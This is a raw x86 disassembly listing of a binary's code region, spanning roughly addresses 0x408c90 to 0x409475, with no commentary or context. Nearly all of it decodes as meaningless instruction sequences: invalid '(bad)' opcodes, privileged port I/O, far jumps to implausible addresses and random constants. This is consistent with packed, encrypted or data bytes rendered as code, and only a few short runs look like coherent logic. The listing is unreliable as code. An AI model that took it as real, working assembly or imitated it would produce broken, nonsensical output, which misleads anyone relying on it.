  408c90:	add    ecx,DWORD PTR cs:[edx-0x3]
  408c94:	int3   
  408c95:	push   ds
  408c96:	icebp  
  408c97:	and    al,0xda
  408c99:	addr16 mov dl,0x8a
  408c9c:	dec    BYTE PTR [esi]
  408c9e:	stos   DWORD PTR es:[edi],eax
  408c9f:	jns    0x408c99
  408ca1:	dec    edi
  408ca2:	mov    ecx,0x3153d677
  408ca7:	mov    DWORD PTR [esi],ebx
  408ca9:	cmp    bh,BYTE PTR [ebx]
  408cab:	pop    edi
  408cac:	add    edi,DWORD PTR [esi+0x7]
  408caf:	(bad)  
  408cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cb2:	mov    edi,0xd0fd681d
  408cb7:	bound  eax,QWORD PTR [edx]
  408cb9:	xchg   esi,eax
  408cba:	xor    DWORD PTR [ebx-0x22],ebx
  408cbd:	mov    al,BYTE PTR [edi]
  408cbf:	xchg   ebp,eax
  408cc0:	pop    edx
  408cc1:	jge    0x408d32
  408cc3:	in     al,0x84
  408cc5:	sub    al,0xeb
  408cc7:	fninit 
  408cc9:	jmp    0x408cdf
  408ccb:	outs   dx,BYTE PTR ds:[esi]
  408ccc:	xlat   BYTE PTR es:[ebx]
  408cce:	mov    ebp,0xca6ec64a
  408cd3:	jp     0x408c68
  408cd5:	ins    DWORD PTR es:[edi],dx
  408cd6:	neg    ebx
  408cd8:	add    cl,BYTE PTR [eax]
  408cda:	pop    ecx
  408cdb:	popf   
  408cdc:	test   BYTE PTR [ebp-0x5b80a704],cl
  408ce2:	enter  0x15,0xf6
  408ce6:	js     0x408d52
  408ce8:	(bad)  
  408ce9:	and    DWORD PTR [edi+0x4e],ebp
  408cec:	fild   QWORD PTR [ebp+0x3]
  408cef:	fidiv  DWORD PTR [ebx-0x33]
  408cf2:	loopne 0x408c9b
  408cf4:	es je  0x408c81
  408cf7:	stc    
  408cf8:	or     esi,DWORD PTR [esi+0x36]
  408cfb:	sar    DWORD PTR [eax-0x6d],1
  408cfe:	or     eax,0x4d812d17
  408d03:	and    edi,ebx
  408d05:	sub    BYTE PTR fs:[ecx-0x28267306],al
  408d0c:	and    dh,BYTE PTR [edx]
  408d0e:	jb     0x408cc4
  408d10:	(bad)  [ecx-0x57b4fd13]
  408d16:	retf   
  408d17:	aaa    
  408d18:	inc    esi
  408d19:	xor    DWORD PTR [edx],esi
  408d1b:	lds    ebx,FWORD PTR [edx]
  408d1d:	or     eax,0x3b709062
  408d22:	ins    DWORD PTR es:[edi],dx
  408d23:	cdq    
  408d24:	pop    es
  408d25:	stos   DWORD PTR es:[edi],eax
  408d26:	imul   edi,DWORD PTR [edx],0x32
  408d29:	add    DWORD PTR [edx],0x5
  408d2c:	bound  ebp,QWORD PTR [esp+edi*1-0x5d]
  408d30:	inc    ebp
  408d31:	sub    ecx,edx
  408d33:	inc    eax
  408d34:	xor    eax,0xdc1c640
  408d39:	fcmovbe st,st(7)
  408d3b:	and    dl,BYTE PTR [ebp-0x51]
  408d3e:	out    dx,al
  408d3f:	outs   dx,BYTE PTR ds:[esi]
  408d40:	and    eax,0x8c1d437a
  408d45:	xchg   edx,eax
  408d46:	pusha  
  408d47:	icebp  
  408d48:	xor    DWORD PTR [esi-0x3a30e303],eax
  408d4e:	pop    ebx
  408d4f:	lds    edx,FWORD PTR [ebx+eiz*1]
  408d52:	and    DWORD PTR [esi],edx
  408d54:	pop    ss
  408d55:	add    al,BYTE PTR [ecx-0x25f67e71]
  408d5b:	imul   ecx,DWORD PTR [edx-0x596bd8d6],0xca729eec
  408d65:	gs mov dl,0x4f
  408d68:	xor    al,0x16
  408d6a:	lods   al,BYTE PTR ds:[esi]
  408d6b:	in     eax,0xff
  408d6d:	push   0xe9519d5f
  408d72:	lds    esp,FWORD PTR [eax-0x7d]
  408d75:	nop
  408d76:	jno    0x408dab
  408d78:	test   DWORD PTR [ecx+edi*4+0x789309ab],0x480a1499
  408d83:	push   esp
  408d84:	add    DWORD PTR [esi+0x7c712acf],ecx
  408d8a:	in     al,0x22
  408d8c:	cmp    eax,DWORD PTR [edi-0x45]
  408d8f:	push   ebx
  408d90:	imul   eax,DWORD PTR [ebx+ebx*8+0x11d5d1],0xffffffb1
  408d98:	mov    DWORD PTR [edi-0x729f0775],ecx
  408d9e:	and    eax,0xe3249737
  408da3:	outs   dx,DWORD PTR ds:[esi]
  408da4:	outs   dx,BYTE PTR ds:[esi]
  408da5:	mov    BYTE PTR [ecx+0x4b21944d],cl
  408dab:	ficom  DWORD PTR [ecx]
  408dad:	test   eax,0x32c67783
  408db2:	jmp    0x65d0d062
  408db7:	mov    ecx,0x53350e7a
  408dbc:	xchg   ebx,eax
  408dbd:	cmp    eax,0x10dd89ff
  408dc2:	rol    BYTE PTR [edx],1
  408dc4:	les    edx,FWORD PTR [ebp-0x54]
  408dc7:	out    dx,al
  408dc8:	xchg   BYTE PTR [eax],bh
  408dca:	in     eax,0x11
  408dcc:	and    al,0xe2
  408dce:	add    DWORD PTR [edi],eax
  408dd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dd1:	push   edx
  408dd2:	call   0xafc85edd
  408dd7:	mov    ds:0x674677f6,al
  408ddc:	inc    ecx
  408ddd:	cmp    ebp,eax
  408ddf:	inc    ecx
  408de0:	xor    al,BYTE PTR [edx+ebp*4-0xf]
  408de4:	mov    ecx,0x31060152
  408de9:	mov    eax,0x555c73bd
  408dee:	lock cmp eax,0x3670daee
  408df4:	jge    0x408de4
  408df6:	and    al,0x8b
  408df8:	lods   al,BYTE PTR ds:[esi]
  408df9:	mov    ebx,0xa86bf9ce
  408dfe:	rcr    BYTE PTR [esi+0x29],0x72
  408e02:	in     eax,dx
  408e03:	mov    BYTE PTR [edx+0x58],cl
  408e06:	mov    eax,0x57a19c94
  408e0b:	cmp    al,0x49
  408e0d:	loope  0x408e42
  408e0f:	sbb    edi,DWORD PTR ds:0x8d6fdd9a
  408e15:	fild   DWORD PTR [esi]
  408e17:	sbb    eax,0x28371268
  408e1c:	neg    BYTE PTR [ebp+0x2bba9cc0]
  408e22:	push   eax
  408e23:	aad    0x9d
  408e25:	adc    DWORD PTR [ecx+edx*8-0x34],ebp
  408e29:	cmp    BYTE PTR [ebp+0x55],0xb9
  408e2d:	mov    al,0xe6
  408e2f:	loop   0x408e5c
  408e31:	or     eax,0x3929987
  408e36:	test   DWORD PTR [ecx-0x2c9787c9],edx
  408e3c:	scas   eax,DWORD PTR es:[edi]
  408e3d:	mov    eax,0xfda0a6d
  408e42:	lods   al,BYTE PTR ds:[esi]
  408e43:	rol    BYTE PTR [edx],1
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	jbe    0x408e17
  408e77:	lock mov esi,0x1818513a
  408e7d:	sahf   
  408e7e:	adc    bl,BYTE PTR [eax]
  408e80:	sbb    BYTE PTR [eax+0x3f],cl
  408e83:	jno    0x408e7d
  408e85:	jge    0x408e8f
  408e87:	cwde   
  408e88:	jmp    0x7f8c:0x8d31cd24
  408e8f:	mov    dh,0xed
  408e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e92:	test   BYTE PTR [ebx-0x26],0xbf
  408e96:	lahf   
  408e97:	xchg   esi,eax
  408e98:	cdq    
  408e99:	xor    al,0x52
  408e9b:	ret    0x12e4
  408e9e:	in     eax,0xfc
  408ea0:	and    ebp,esi
  408ea2:	das    
  408ea3:	lea    ebx,[eax+eiz*8+0x64a0dd4c]
  408eaa:	or     edx,DWORD PTR [ebx]
  408eac:	mov    esi,0xbf07e228
  408eb1:	mov    cl,0xf6
  408eb3:	pusha  
  408eb4:	enter  0x67a9,0x54
  408eb8:	mov    ebp,0x7be552d9
  408ebd:	or     DWORD PTR [eax],edi
  408ebf:	add    ebp,esp
  408ec1:	add    DWORD PTR [ebp-0x6461508],esp
  408ec7:	outs   dx,DWORD PTR ds:[esi]
  408ec8:	cmp    dh,BYTE PTR [edx-0x2c]
  408ecb:	inc    ebx
  408ecc:	xchg   ebp,eax
  408ecd:	enter  0x42b3,0x26
  408ed1:	mov    edx,0x4ce27de8
  408ed6:	or     BYTE PTR [ecx-0x25],dh
  408ed9:	sbb    eax,ebp
  408edb:	sub    dh,0x98
  408ede:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  408ee0:	push   eax
  408ee1:	inc    edi
  408ee2:	sbb    eax,0x85020e14
  408ee7:	jge    0x408f01
  408ee9:	inc    ebp
  408eea:	cmp    DWORD PTR [ebp-0x5f8a36e0],eax
  408ef0:	push   0x3f054ed1
  408ef5:	xchg   edx,eax
  408ef6:	idiv   BYTE PTR ds:0x7458bc74
  408efc:	in     al,0x82
  408efe:	div    ebx
  408f00:	xlat   BYTE PTR ds:[ebx]
  408f01:	mov    dh,0xd0
  408f03:	mov    bl,0x2f
  408f05:	add    DWORD PTR [ebx+eax*1+0x7ede6e9e],eax
  408f0c:	pop    ss
  408f0d:	pusha  
  408f0e:	jb     0x408f43
  408f10:	xchg   edx,eax
  408f11:	xor    al,0x9
  408f13:	sub    BYTE PTR [ecx-0x1],0xa7
  408f17:	into   
  408f18:	mov    edi,0x667c819a
  408f1d:	sub    dl,dl
  408f1f:	pop    edx
  408f20:	jnp    0x408f5b
  408f22:	int3   
  408f23:	cld    
  408f24:	sar    DWORD PTR [esi+0x7c],cl
  408f27:	jbe    0x408f6f
  408f29:	call   0x86e8:0x6e568ed1
  408f30:	pop    ss
  408f31:	add    BYTE PTR [ecx-0x13],0x8a
  408f35:	add    eax,DWORD PTR [ecx-0xfc5adc5]
  408f3b:	out    0x7d,eax
  408f3d:	out    0x43,eax
  408f3f:	fist   DWORD PTR [esi+0x58]
  408f42:	mov    ds:0xaa5dd5c4,eax
  408f47:	jno    0x408f5f
  408f49:	sub    bl,BYTE PTR [edi+0x24ee527d]
  408f4f:	jb     0x408f16
  408f51:	mov    ch,0xcf
  408f53:	mov    ds:0xb27c45ea,eax
  408f58:	pushf  
  408f59:	adc    al,0x11
  408f5b:	mov    ah,BYTE PTR [eax+0x56cb4e1a]
  408f61:	xor    BYTE PTR [edi-0x697e5ef7],0xcc
  408f68:	xchg   edi,eax
  408f69:	inc    ebx
  408f6a:	cmp    edi,ebp
  408f6c:	sbb    BYTE PTR [edx],0xf3
  408f6f:	and    DWORD PTR [ecx+0x10],0x1d16f088
  408f76:	mov    ebx,0x373b1ad5
  408f7b:	mov    ds:0xa877f6cb,eax
  408f80:	out    dx,al
  408f81:	or     ch,BYTE PTR [edi]
  408f83:	cmp    BYTE PTR [edx],ch
  408f85:	arpl   ax,bx
  408f87:	dec    ebp
  408f88:	retf   
  408f89:	cmp    al,0x17
  408f8b:	sbb    DWORD PTR ds:0xf8b77719,0x0
  408f92:	lods   al,BYTE PTR ds:[esi]
  408f93:	lods   eax,DWORD PTR ds:[esi]
  408f94:	inc    esi
  408f95:	fidivr WORD PTR [ecx+eiz*4+0x7e20ff3]
  408f9c:	mov    ds:0x5b519dd4,eax
  408fa1:	mov    esi,0xd34cf97f
  408fa6:	and    cl,BYTE PTR [eax+0x6d9dea36]
  408fac:	call   ecx
  408fae:	mov    cl,0x5a
  408fb0:	add    eax,0xe99e0ec2
  408fb5:	mov    ecx,0x8b8450f9
  408fba:	push   ecx
  408fbb:	out    0xf6,eax
  408fbd:	sbb    eax,0xb5b4d646
  408fc2:	push   ebp
  408fc3:	iret   
  408fc4:	and    BYTE PTR [ebx-0x54],ah
  408fc7:	fistp  WORD PTR [ecx+0x4a]
  408fca:	mov    ebx,0x21381ea5
  408fcf:	aaa    
  408fd0:	data16 lock (bad) 
  408fd3:	aas    
  408fd4:	sub    eax,0xeb3a76a8
  408fd9:	test   al,0x23
  408fdb:	mov    ebp,0x321c273b
  408fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fe1:	push   esp
  408fe2:	aam    0x13
  408fe4:	std    
  408fe5:	adc    eax,0xe180acc2
  408fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408feb:	std    
  408fec:	scas   eax,DWORD PTR es:[edi]
  408fed:	push   cs
  408fee:	mov    BYTE PTR [esi+edi*1-0x59dad895],dl
  408ff5:	pop    ds
  408ff6:	xor    dh,bl
  408ff8:	cmp    DWORD PTR [esi+0x7b974a3e],ecx
  408ffe:	rcl    DWORD PTR [eax-0x5e],1
  409001:	or     DWORD PTR [edx],edi
  409003:	retf   
  409004:	adc    ch,BYTE PTR [eax]
  409006:	std    
  409007:	push   es
  409008:	in     eax,0x1e
  40900a:	mov    ah,0xeb
  40900c:	mov    esi,0xf68e8203
  409011:	hlt    
  409012:	jge    0x40901c
  409014:	call   0x2f478e34
  409019:	pop    ebp
  40901a:	lock cmp BYTE PTR [ebx+0x50],dh
  40901e:	and    esi,edi
  409020:	fistp  QWORD PTR [eax+eiz*2+0x4f]
  409024:	sti    
  409025:	in     al,dx
  409026:	jbe    0x408ffd
  409028:	aad    0x7b
  40902a:	add    BYTE PTR [esi-0x7f],0x36
  40902e:	sahf   
  40902f:	fidiv  DWORD PTR [edi+ecx*2-0x33]
  409033:	jae    0x409097
  409035:	xchg   ah,bh
  409037:	and    al,0x67
  409039:	test   ecx,esp
  40903b:	ret    0xa9c5
  40903e:	mov    al,ds:0x22d4ef66
  409043:	pop    esp
  409044:	loop   0x409024
  409046:	or     DWORD PTR [ecx+0x962ffc8],ebp
  40904c:	dec    edi
  40904d:	retf   
  40904e:	xlat   BYTE PTR ds:[ebx]
  40904f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409050:	push   edx
  409051:	pop    esp
  409052:	data16 out dx,al
  409054:	lock and al,0xd0
  409057:	jnp    0x40903e
  409059:	sub    bh,BYTE PTR [edx]
  40905b:	lods   eax,DWORD PTR ds:[esi]
  40905c:	jnp    0x409082
  40905e:	(bad)  
  40905f:	dec    esi
  409060:	mov    cl,0x51
  409062:	sub    BYTE PTR [eax+0x661d40a2],0xdd
  409069:	in     eax,0xe
  40906b:	daa    
  40906c:	fsub   QWORD PTR ds:0xf57e0186
  409072:	mov    dl,0x9a
  409074:	push   ebx
  409075:	dec    eax
  409076:	sbb    BYTE PTR [edi+0x55],bl
  409079:	adc    DWORD PTR [ebx],edi
  40907b:	pop    ebx
  40907c:	scas   al,BYTE PTR es:[edi]
  40907d:	xor    eax,0x237aaa76
  409082:	mov    edi,0x6f7b9a3
  409087:	cli    
  409088:	arpl   si,ax
  40908a:	mov    BYTE PTR [edi+0x58d7c68d],dl
  409090:	pop    es
  409091:	cmc    
  409092:	sbb    eax,0xbd3b199d
  409097:	fimul  WORD PTR [eax-0x1eb4c812]
  40909d:	popf   
  40909e:	gs data16 loop 0x40903d
  4090a2:	mov    ecx,0x5b0f30f7
  4090a7:	je     0x40911c
  4090a9:	iret   
  4090aa:	fidivr WORD PTR [eax+eax*8+0x7d]
  4090ae:	inc    esp
  4090af:	mov    edx,0x69dfc4a
  4090b4:	jl     0x4090bb
  4090b6:	(bad)  
  4090b7:	sub    esp,esi
  4090b9:	push   edi
  4090ba:	add    edi,DWORD PTR [eax+0x11]
  4090bd:	out    dx,al
  4090be:	mov    ch,0x31
  4090c0:	push   0x7b
  4090c2:	inc    eax
  4090c3:	jno    0x409094
  4090c5:	iret   
  4090c6:	add    al,0x39
  4090c8:	mov    ebp,0xcd6597ba
  4090cd:	jo     0x40910b
  4090cf:	mov    bl,0xc3
  4090d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090d2:	jns    0x409096
  4090d4:	xchg   esi,eax
  4090d5:	test   BYTE PTR [ebx+ecx*1],dl
  4090d8:	push   es
  4090d9:	int3   
  4090da:	jge    0x4090bd
  4090dc:	daa    
  4090dd:	or     BYTE PTR [ebp+ebp*1+0x6b],0x7b
  4090e2:	iret   
  4090e3:	sub    cl,al
  4090e5:	inc    ebp
  4090e6:	(bad)  
  4090e7:	inc    ecx
  4090e8:	test   al,0x28
  4090ea:	int    0x89
  4090ec:	repz test DWORD PTR [ecx+0x46],esp
  4090f0:	cwde   
  4090f1:	in     eax,dx
  4090f2:	mov    al,0xa5
  4090f4:	loop   0x4090e7
  4090f6:	repz cmp DWORD PTR [ecx-0x5c955528],0xf0ff7915
  409101:	pop    ss
  409102:	gs cmp dl,al
  409105:	dec    edi
  409106:	mov    ebx,0xb8705acd
  40910b:	mov    esp,edi
  40910d:	jmp    0x6978:0x15ef69a6
  409114:	xor    BYTE PTR [eax],bh
  409116:	enter  0x3c7e,0xc6
  40911a:	xchg   edx,eax
  40911b:	ficom  WORD PTR [edx+0x4fa1bf02]
  409121:	ins    BYTE PTR es:[edi],dx
  409122:	icebp  
  409123:	xor    al,0x5
  409125:	pusha  
  409126:	mov    esi,0xc9e1df27
  40912b:	push   ebp
  40912c:	(bad)  [edi+eax*4-0x765615d4]
  409133:	inc    edx
  409134:	push   eax
  409135:	sub    BYTE PTR [esi],0x7
  409138:	jne    0x4091a1
  40913a:	push   ecx
  40913b:	xlat   BYTE PTR ds:[ebx]
  40913c:	add    eax,0x951505d5
  409141:	neg    DWORD PTR [edi-0x14]
  409144:	retf   0x938
  409147:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409148:	push   cs
  409149:	adc    BYTE PTR [ebp-0xe8fe7ee],0x68
  409150:	je     0x409165
  409152:	lods   al,BYTE PTR ds:[esi]
  409153:	dec    esi
  409154:	push   edi
  409155:	popa   
  409156:	fcmove st,st(3)
  409158:	arpl   WORD PTR [ecx],di
  40915a:	jae    0x409167
  40915c:	cwde   
  40915d:	inc    esp
  40915e:	pop    edi
  40915f:	jo     0x4091bc
  409161:	or     eax,0x5037fd03
  409166:	jbe    0x40914e
  409168:	hlt    
  409169:	repz xchg esi,eax
  40916b:	push   esp
  40916c:	fild   WORD PTR [esp-0x27e6c43a]
  409173:	xor    al,0x4
  409175:	sbb    bl,BYTE PTR es:[esi+ebx*1]
  409179:	aas    
  40917a:	xchg   esp,eax
  40917b:	faddp  st(7),st
  40917d:	mov    eax,0x5c062a2d
  409182:	sbb    DWORD PTR ds:[edi+0x7a],ebx
  409186:	xchg   ebp,ebp
  409188:	mov    bh,0x45
  40918a:	ret    0x8d54
  40918d:	xchg   DWORD PTR [ecx+0x1cfd5c24],ebp
  409193:	div    BYTE PTR [ebx+eiz*2]
  409196:	and    eax,0x56c8a49c
  40919b:	mov    edx,DWORD PTR [ebp+0x533bda54]
  4091a1:	mov    al,0x3f
  4091a3:	imul   edx,DWORD PTR [ecx+0xb86a488],0x21
  4091aa:	inc    BYTE PTR [eax+0x73]
  4091ad:	or     ebx,DWORD PTR [ebp-0x1f03e1ce]
  4091b3:	dec    BYTE PTR [ebx]
  4091b5:	cmp    bl,BYTE PTR [ecx+0x3]
  4091b8:	aaa    
  4091b9:	jno    0x40918c
  4091bb:	and    eax,0xb0633684
  4091c0:	jno    0x40918b
  4091c2:	mov    eax,esp
  4091c4:	push   es
  4091c5:	mov    ah,BYTE PTR [esi-0x133219ff]
  4091cb:	sbb    dh,BYTE PTR [edi+0x56a1b79]
  4091d1:	dec    ecx
  4091d2:	xor    esi,ecx
  4091d4:	fbld   TBYTE PTR [esp+ebx*4+0x4fce7943]
  4091db:	pop    eax
  4091dc:	xor    al,0xe7
  4091de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091df:	sub    ebx,DWORD PTR [ebp+0x57e4ec1]
  4091e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091e6:	jae    0x409228
  4091e8:	retf   
  4091e9:	popa   
  4091ea:	mov    ds:0x968fbd4b,eax
  4091ef:	mov    gs,WORD PTR [esp+ebp*2+0x71]
  4091f3:	mov    WORD PTR [eax],fs
  4091f5:	xchg   edx,eax
  4091f6:	scas   eax,DWORD PTR es:[edi]
  4091f7:	xchg   DWORD PTR [ebx],eax
  4091f9:	out    0x82,eax
  4091fb:	mov    ebx,0x38d4c588
  409200:	ret    
  409201:	xor    eax,0xbbd96b4b
  409206:	or     eax,DWORD PTR [eax+edx*8+0x4e]
  40920a:	sti    
  40920b:	pop    esi
  40920c:	pushf  
  40920d:	or     eax,0xa2aff3ac
  409212:	dec    ebx
  409213:	sti    
  409214:	(bad)
  409217:	jae    0x40920f
  409219:	dec    esi
  40921a:	add    eax,0xaf74505b
  40921f:	ror    BYTE PTR [esp+ecx*8-0x5593486d],cl
  409226:	hlt    
  409227:	dec    ebx
  409228:	xchg   ebp,eax
  409229:	jbe    0x4091eb
  40922b:	cmp    eax,DWORD PTR ds:[esi+0x4278de30]
  409232:	adc    eax,DWORD PTR [esi+0x689400bf]
  409238:	popf   
  409239:	dec    edx
  40923a:	xchg   esi,eax
  40923b:	pushf  
  40923c:	pushf  
  40923d:	jns    0x40923f
  40923f:	jmp    0xd2744634
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0x79619570
  409261:	jl     0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    dh,cl
  40926b:	cmp    cl,BYTE PTR [ebx-0x54cb2322]
  409271:	and    al,0x2
  409273:	test   al,0xc6
  409275:	cmc    
  409276:	or     edx,DWORD PTR [edi]
  409278:	addr16 icebp 
  40927a:	outs   dx,DWORD PTR ds:[esi]
  40927b:	enter  0x7c0c,0xd3
  40927f:	aam    0x24
  409281:	sub    al,0x6
  409283:	inc    ebx
  409284:	add    edi,DWORD PTR [esi+edi*1]
  409287:	or     BYTE PTR [esi+ebp*8+0x77],bh
  40928b:	mov    esp,0x8d8b8182
  409290:	test   al,0x9
  409292:	dec    BYTE PTR [eax+0x6311700c]
  409298:	sub    ch,ch
  40929a:	xchg   ecx,eax
  40929b:	lds    edx,FWORD PTR [eax+0x2a]
  40929e:	sub    eax,0xd502ca47
  4092a3:	mov    ah,0xc8
  4092a5:	fisubr WORD PTR [esi+0x3d]
  4092a8:	gs mov ah,0x42
  4092ab:	shl    DWORD PTR [edx+0x5cd24b4e],0xfd
  4092b2:	cmp    ah,BYTE PTR [edi]
  4092b4:	popa   
  4092b5:	addr16 popf 
  4092b7:	xlat   BYTE PTR ds:[ebx]
  4092b8:	dec    edx
  4092b9:	jno    0x40930b
  4092bb:	sub    ah,bh
  4092bd:	sti    
  4092be:	out    dx,al
  4092bf:	jp     0x409292
  4092c1:	gs add al,0x90
  4092c4:	mov    dl,0x80
  4092c6:	rcl    BYTE PTR gs:[eax-0x3ef213ae],cl
  4092cd:	inc    edx
  4092ce:	inc    eax
  4092cf:	sub    BYTE PTR [edi-0x2cbf7dc],dh
  4092d5:	adc    cl,dl
  4092d7:	shl    ebp,1
  4092d9:	test   al,0xff
  4092db:	pop    edx
  4092dc:	into   
  4092dd:	in     eax,dx
  4092de:	shl    DWORD PTR [ebp-0x2fc3edc2],1
  4092e4:	cmp    eax,DWORD PTR [esi]
  4092e6:	adc    DWORD PTR ds:0x1872ce21,0xffffff9a
  4092ed:	rcr    dl,1
  4092ef:	xchg   esp,eax
  4092f0:	adc    al,0x2a
  4092f2:	out    dx,eax
  4092f3:	test   BYTE PTR [eax+ecx*1-0x18],ch
  4092f7:	xor    ebx,edi
  4092f9:	ret    0x73e9
  4092fc:	fimul  WORD PTR [edx+0xb]
  4092ff:	add    dh,BYTE PTR [ebx]
  409301:	sub    al,0x4d
  409303:	into   
  409304:	pop    esp
  409305:	pop    esp
  409306:	mov    ds:0x77804ed6,al
  40930b:	jle    0x4092b4
  40930d:	xchg   ebp,eax
  40930e:	mov    edx,0x9c41d39f
  409313:	mov    al,ds:0xd634cc93
  409318:	into   
  409319:	mov    dl,0x5
  40931b:	sbb    eax,0x2c627a65
  409320:	addr16 mov dh,0x6b
  409323:	mov    esi,0xe8a42975
  409328:	or     dh,BYTE PTR [edi-0x57603d38]
  40932e:	sahf   
  40932f:	mov    bh,0x4a
  409331:	xlat   BYTE PTR ds:[ebx]
  409332:	outs   dx,DWORD PTR ds:[esi]
  409333:	dec    esp
  409334:	verr   WORD PTR [edx]
  409337:	dec    esi
  409338:	aaa    
  409339:	adc    ecx,DWORD PTR [edi+0xb]
  40933c:	(bad)  
  40933d:	aas    
  40933e:	rcl    DWORD PTR [ecx+ecx*1-0x25],1
  409342:	and    ah,ah
  409344:	mov    edi,esp
  409346:	into   
  409347:	adc    eax,0xe73f2e0a
  40934c:	add    DWORD PTR [edi-0xf],esp
  40934f:	cs mov eax,0x31758ba1
  409355:	xor    DWORD PTR [esi],esp
  409357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409358:	loop   0x409364
  40935a:	stos   DWORD PTR es:[edi],eax
  40935b:	punpckldq mm0,mm5
  40935e:	or     bh,ah
  409360:	call   FWORD PTR [eax+0x2a]
  409363:	arpl   WORD PTR [eax+ebx*2],dx
  409366:	fcom   QWORD PTR ds:0x5a686505
  40936c:	sub    al,BYTE PTR [esi-0x38]
  40936f:	call   0x559d0c42
  409374:	mov    edi,0xa5f7b23c
  409379:	xor    esp,DWORD PTR [ecx]
  40937b:	stos   DWORD PTR es:[edi],eax
  40937c:	not    edx
  40937e:	dec    edi
  40937f:	inc    eax
  409380:	sub    BYTE PTR [ebp+0x3c],cl
  409383:	ror    DWORD PTR [ebx],cl
  409385:	sbb    bh,BYTE PTR [ecx-0x76db8de5]
  40938b:	mov    WORD PTR [eax],gs
  40938d:	xchg   edx,eax
  40938e:	mov    eax,DWORD PTR [ebx-0x3166ee37]
  409394:	dec    BYTE PTR [edi-0x20]
  409397:	and    al,0xa
  409399:	(bad)  
  40939a:	lahf   
  40939b:	xchg   esp,eax
  40939c:	jno    0x40938a
  40939e:	xor    DWORD PTR [esi+0x6d2131da],0xfad71534
  4093a8:	scas   eax,DWORD PTR es:[edi]
  4093a9:	outs   dx,DWORD PTR ds:[esi]
  4093aa:	mov    esi,0xcdc213cb
  4093af:	lods   eax,DWORD PTR ds:[esi]
  4093b0:	jl     0x409426
  4093b2:	cmp    edi,DWORD PTR [ebx]
  4093b4:	pushf  
  4093b5:	in     eax,0x31
  4093b7:	adc    eax,0x4c86e77d
  4093bc:	xor    edi,DWORD PTR [ebx]
  4093be:	adc    al,0xb9
  4093c0:	push   ecx
  4093c1:	cmp    al,0xbe
  4093c3:	pusha  
  4093c4:	and    BYTE PTR [ecx],ah
  4093c6:	ja     0x4093ff
  4093c8:	dec    ebp
  4093c9:	mov    cl,dl
  4093cb:	sbb    bl,BYTE PTR [edx+ebp*1-0x23abb64f]
  4093d2:	and    ah,BYTE PTR [eax]
  4093d4:	dec    eax
  4093d5:	das    
  4093d6:	stos   DWORD PTR es:[edi],eax
  4093d7:	jmp    0x86c41dad
  4093dc:	test   eax,0xb5e90b4
  4093e1:	push   ebx
  4093e2:	cmc    
  4093e3:	and    cl,BYTE PTR [ebp-0x4c]
  4093e6:	into   
  4093e7:	adc    DWORD PTR [edi],esi
  4093e9:	jne    0x4093ec
  4093eb:	pop    esi
  4093ec:	mov    ecx,0x80420afd
  4093f1:	add    eax,0xaf68529c
  4093f6:	and    al,0xa8
  4093f8:	mov    bl,0xdf
  4093fa:	(bad)  
  4093fb:	mov    ds:0xb139a003,eax
  409400:	cmp    cl,BYTE PTR [esi-0x5a715074]
  409406:	mov    bl,0x80
  409408:	cs ja  0x4093f7
  40940b:	test   bh,ch
  40940d:	inc    ebx
  40940e:	test   DWORD PTR [eax],edi
  409410:	xchg   edx,eax
  409411:	jp     0x409485
  409413:	out    dx,al
  409414:	inc    ebp
  409415:	adc    eax,0x42f65732
  40941a:	out    dx,al
  40941b:	(bad)  
  40941c:	mov    ds:0x28082335,al
  409421:	mov    eax,0x60ab9ef9
  409426:	test   BYTE PTR [edx+0x4abfc5cc],0xf5
  40942d:	fisttp QWORD PTR [eax-0x660f7494]
  409433:	imul   esi,DWORD PTR [ebx],0xd542bf6a
  409439:	(bad)  
  40943a:	jne    0x409493
  40943c:	pop    eax
  40943d:	arpl   WORD PTR [esi-0x19],ax
  409440:	lods   eax,DWORD PTR ds:[esi]
  409441:	lahf   
  409442:	loopne 0x4094ac
  409444:	popf   
  409445:	fnstsw WORD PTR [edi-0x67]
  409448:	(bad)  
  409449:	mov    ch,0x62
  40944b:	ins    BYTE PTR es:[edi],dx
  40944c:	mov    BYTE PTR [edx+0x4b],ah
  40944f:	jae    0x4094a1
  409451:	cmp    eax,0xf89cc51f
  409456:	sbb    dl,0x20
  409459:	adc    DWORD PTR [ebx-0x3847180],edi
  40945f:	loope  0x4093e2
  409461:	stos   BYTE PTR es:[edi],al
  409462:	jge    0x4094ba
  409464:	popf   
  409465:	push   esi
  409466:	neg    ecx
  409468:	jl     0x409497
  40946a:	aam    0xe4
  40946c:	enter  0xf917,0xdd
  409470:	mov    cl,0x91
  409472:	(bad)  
  409473:	ins    BYTE PTR es:[edi],dx
  409474:	das    
  409475:	mov    eax,0x402fd375
